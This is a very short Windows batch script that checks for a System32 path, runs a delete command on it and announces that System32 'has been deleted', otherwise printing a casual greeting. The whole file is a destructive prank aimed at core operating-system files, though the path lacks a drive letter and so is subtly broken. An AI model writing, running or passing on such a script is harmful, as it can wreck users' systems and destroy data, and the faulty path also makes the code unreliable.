@echo off
if exist ":\Windows\System32" (
    del ":\Windows\System32"
    echo :\Windows\System32 has been deleted
) else (
    echo hello bro how are u
)
